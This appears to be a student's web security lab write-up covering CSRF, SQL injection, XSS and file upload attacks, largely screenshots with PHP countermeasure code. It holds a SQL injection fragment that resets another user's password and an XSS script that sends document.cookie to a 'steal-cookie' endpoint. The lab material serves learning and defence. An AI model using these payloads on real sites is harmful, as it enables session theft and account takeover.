# SOP 
1. Using JS to access DOM objects of the web site

   ![image](https://github.com/user-attachments/assets/5f48d35c-88ce-4ae1-8ef4-0ada9fc8e58d)

User Authentication: Since the victim is already logged in to mysite.com, their browser will include the valid session cookies or authentication tokens automatically when the request is sent to http://mysite.com/transfer.php.
Trust Misuse: The server assumes the request comes from a legitimate user and processes it, not realizing it was crafted by an attacker.

   docker exec -it naughty_ramanujan sh -l

 echo "10.9.0.5 mysite.com" >> /etc/hosts

 echo "10.9.0.5 darksite.com" >> /etc/hosts


 ![image](https://github.com/user-attachments/assets/c1bc280a-9aeb-4216-aeb3-4566f35fed3e)


 ![image](https://github.com/user-attachments/assets/cc3b1826-63fc-4266-9f4a-ff88d6614837)


4c. Fail because The User Must Be Logged In: The victim must already be authenticated on http://mysite.com with a valid session.

4d. Enter the cookie value 

![image](https://github.com/user-attachments/assets/59a8a108-dcf8-4732-887c-8c2b59dc4846)


![image](https://github.com/user-attachments/assets/4132d313-715b-44f8-99e0-c16a080c8b91)


```php
<?php
session_start();

// Generate CSRF token if not already set
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // Generate a new token
}

// Authenticate the user
if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    header('Location: login.php');
    exit();
} else {
    echo "Welcome, " . $_SESSION['username'] . "!";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Validate CSRF token
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die('CSRF token validation failed!');
    }

    $amount = $_POST['amount'];
    $to = $_POST['to'];

    // Transfer the amount
    $balance = $_SESSION['balance'];
    if ($balance >= $amount) {
        $balance -= $amount;
        $_SESSION['balance'] = $balance;
        // Perform transfer
        $transfer = "Transfer {$amount} to {$to}<br>";
        echo $transfer;
        echo "Amount left {$balance}<hr>";
    } else {
        die('Insufficient balance!');
    }
}
?>

<form action="" method="POST">  
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <label for="amount">Amount:</label>
    <input type="number" id="amount" name="amount" required>
    <br>
    <label for="to">To:</label>
    <input type="text" id="to" name="to" required>
    <br>
    <input type="submit" name="transfer" value="Transfer">
</form>
```

# XSS 

   console.log(document.cookie)

4.4.1. Modify your own salary.

![image](https://github.com/user-attachments/assets/dfc5832f-4204-4ed6-a1e8-f36776b8cd6d)


![image](https://github.com/user-attachments/assets/4636f1c2-4c86-45bf-91b1-d3b995e00d42)


    

4.4.2. Modify other people’ salary


![image](https://github.com/user-attachments/assets/9d3fec17-d006-4ecd-838a-d2559d03c986)


![image](https://github.com/user-attachments/assets/b98a910c-8c37-4243-9e16-9cd45f33fcfb)




![image](https://github.com/user-attachments/assets/b6a0c010-b8b5-4e9a-98b2-fc76dae9dc4b)


son ' , password = 'c22b5f9178342609428d6f51b2c5af4c0bde6a42' where name='Boby' --  

![image](https://github.com/user-attachments/assets/13d117b7-2d02-4744-b40b-2fdbf48cc81c)



![image](https://github.com/user-attachments/assets/1ccfbcf9-f3b3-4964-8355-c1fe30ef673b)



4.5. Countermeasure – Prepared Statement


![image](https://github.com/user-attachments/assets/e44d37c4-daa6-40a9-95b2-9dae628f460d)


![image](https://github.com/user-attachments/assets/10283733-2f68-4018-8e2b-c11f24f8aa21)


![image](https://github.com/user-attachments/assets/72bf67de-3967-4752-bda8-8f4cceefd5fe)




```php
<?php
// Function to create a sql connection.
function getDB() {
  $dbhost="10.9.0.6";
  $dbuser="seed";
  $dbpass="dees";
  $dbname="sqllab_users";

  // Create a DB connection
  $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
  if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error . "\n");
  }
  return $conn;
}

$input_uname = $_GET['username'];
$input_pwd = $_GET['Password'];
$hashed_pwd = sha1($input_pwd);

// create a connection
$conn = getDB();

// Prepare the SQL statement
$stmt = $conn->prepare("SELECT id, name, eid, salary, ssn FROM credential WHERE name = ? AND Password = ?");
if ($stmt === false) {
    die("Prepare failed: " . htmlspecialchars($conn->error));
}

// Bind parameters
$stmt->bind_param("ss", $input_uname, $hashed_pwd); // "ss" means two strings

// Execute the statement
$stmt->execute();

// Get the result
$result = $stmt->get_result();
// do the query
//$result = $conn->query("SELECT id, name, eid, salary, ssn
//                        FROM credential
//                        WHERE name= '$input_uname' and Password= '$hashed_pwd'");
if ($result->num_rows > 0) {
  // only take the first row
  $firstrow = $result->fetch_assoc();
  $id     = $firstrow["id"];
  $name   = $firstrow["name"];
  $eid    = $firstrow["eid"];
  $salary = $firstrow["salary"];
  $ssn    = $firstrow["ssn"];
}


// close the sql connection
$stmt->close();
$conn->close();
?>
```

change this code  



```php
// Prepare the SQL statement
$stmt = $conn->prepare("SELECT id, name, eid, salary, ssn FROM credential WHERE name = ? AND Password = ?");
if ($stmt === false) {
    die("Prepare failed: " . htmlspecialchars($conn->error));
}

// Bind parameters
$stmt->bind_param("ss", $input_uname, $hashed_pwd); // "ss" means two strings

// Execute the statement
$stmt->execute();

// Get the result
$result = $stmt->get_result();
// do the query
//$result = $conn->query("SELECT id, name, eid, salary, ssn
//                        FROM credential
//                        WHERE name= '$input_uname' and Password= '$hashed_pwd'");






$stmt->close();


```
![image](https://github.com/user-attachments/assets/db627429-6bfe-4c30-8f21-2798e37b5e1e)










Web security – XSS – File Upload Vulnerabilitie 


<script> console.log(document.cookie); </script>


![image](https://github.com/user-attachments/assets/4d76d50b-7a72-4af8-8bbe-bd315f9f5cf1)



<script>var stolenCookies = encodeURIComponent(document.cookie);window.location = `http://localhost:5173/steal-cookie?cookies=${stolenCookies}`;</script>

![image](https://github.com/user-attachments/assets/5136c38a-1352-4645-987c-6e2d871aea4f)


![image](https://github.com/user-attachments/assets/65cb8be8-68de-4dfd-87b4-dc0a280753de)



```php
<?php
  if (isset($_POST['search'])) {
    $query = htmlspecialchars($_POST['search'], ENT_QUOTES, 'UTF-8');
    echo "You searched for: " . $query; // Escaped output to prevent XSS
  }
?>
<form action="" method="POST">
  <input type="text" id="search" name="search" required>
  <input type="submit">
</form>
```
![image](https://github.com/user-attachments/assets/658879ed-7ef6-4c07-8df5-d7c6b3ca1b2f)


![image](https://github.com/user-attachments/assets/f2b162c3-fe61-4323-a43c-a516a66375e5)


4.3 Stored-XSS Attac

![image](https://github.com/user-attachments/assets/0741e01e-6577-4141-8338-1d58d9e396c9)

4.3.1.c 


![image](https://github.com/user-attachments/assets/4ee22b2c-6e01-4fa4-b78a-75a2c7ac4fe3)
![image](https://github.com/user-attachments/assets/8e12de44-8abf-4313-bc78-7327737c9730)


![image](https://github.com/user-attachments/assets/cd52be04-3b2b-4639-af8a-c41c9c557312)



![image](https://github.com/user-attachments/assets/aa8f4be1-77fd-42b6-a496-fcd51eba2cd2)

```php

<h2>Stored XSS Demo</h2>
<?php
  if (isset($_POST['submit'])) {
    // Sanitize input before storing it
    $comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');

    // Store the sanitized comment in the comments.txt file
    $file = fopen("comments.txt", "a");
    fwrite($file, $comment . PHP_EOL);
    fclose($file);
  }

  echo "Recent comments:<br>";

  // Read comments from the file and display them
  $file = fopen("comments.txt", "r");
  if ($file) {
    while (($line = fgets($file)) !== false) {
      echo nl2br($line) . "<br>"; // Use nl2br to maintain newlines
    }
    fclose($file);
  } else {
    echo "File error!";
  }
?>

<form method="POST" action="">
  <hr>
  <label for="comment">Leave a comment:</label><br>
  <textarea name="comment" id="comment" style="width:500px; height:300px"></textarea><br>
  <input type="submit" name="submit" value="Submit">
</form>

```



![image](https://github.com/user-attachments/assets/32bc6f95-c1ee-411e-97d5-09fa51995091)

![image](https://github.com/user-attachments/assets/733ba8e1-37f3-4e00-a265-2d147f821b9a)



4.4 Fileupload Attack

![image](https://github.com/user-attachments/assets/d40c24c0-ce7f-4d13-a0f7-4190ce301dd8)


![image](https://github.com/user-attachments/assets/98adbba4-8850-40f7-bb96-e716b5314a76)



![image](https://github.com/user-attachments/assets/d7eb044a-5305-4fd6-908d-3ed63e96f1ec)


```php
<?php
if (isset($_POST['submit'])) {
    $target_dir = "uploads/";
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
    $uploadOk = 1;
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    // Allowed file types
    $allowedTypes = ['jpg', 'jpeg', 'png', 'gif'];

    // Validate file type by extension
    if (!in_array($imageFileType, $allowedTypes)) {
        echo "Sorry, only JPG, JPEG, PNG, and GIF files are allowed.";
        $uploadOk = 0;
    }

    // Validate MIME type for extra security
    $fileMimeType = mime_content_type($_FILES["fileToUpload"]["tmp_name"]);
    $allowedMimeTypes = ['image/jpeg', 'image/png', 'image/gif'];

    if (!in_array($fileMimeType, $allowedMimeTypes)) {
        echo "Invalid file type detected!";
        $uploadOk = 0;
    }

    // Check file size (500KB max)
    if ($_FILES["fileToUpload"]["size"] > 500000) {
        echo "Sorry, your file is too large.";
        $uploadOk = 0;
    }

    // Check if $uploadOk is set to 0 by an error
    if ($uploadOk == 0) {
        echo "Sorry, your file was not uploaded.";
    } else {
        // Attempt to move uploaded file to the target directory
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "The file " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Upload Form</title>
</head>
<body>
    <form action="" method="post" enctype="multipart/form-data">
        <label for="fileToUpload">Select an image file to upload:</label>
        <input type="file" name="fileToUpload" id="fileToUpload"><br><br>
        <input type="submit" value="Upload Image" name="submit">
    </form>
</body>
</html>
```



![image](https://github.com/user-attachments/assets/9673b35f-a1aa-4b7c-a51e-d67e38cafe27)

















